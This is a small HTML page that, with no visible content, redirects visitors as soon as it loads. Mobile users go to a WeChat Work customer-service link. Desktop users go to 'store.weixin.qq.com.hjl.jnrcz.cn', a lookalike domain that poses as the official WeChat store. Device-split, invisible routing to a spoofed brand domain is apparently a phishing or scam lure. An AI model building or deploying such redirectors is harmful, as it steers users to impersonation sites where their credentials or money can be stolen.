<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>页面跳转中</title>
    <script>
      // 判断是否是移动设备
      function isMobileDevice() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
          navigator.userAgent
        );
      }

      // 根据设备类型执行跳转
      function redirectByDevice() {
        if (isMobileDevice()) {
          // 移动设备跳转到企业微信
          window.location.href =
            "https://work.weixin.qq.com/kfid/kfcdb6bc21ea8cea456";
        } else {
          // 桌面设备跳转到桌面网址
          window.location.href = "http://store.weixin.qq.com.hjl.jnrcz.cn";
        }
      }

      // 页面加载完成后立即执行跳转
      document.addEventListener("DOMContentLoaded", redirectByDevice);
    </script>
  </head>
  <body>
    <!-- 移除了所有可视元素 -->
  </body>
</html>
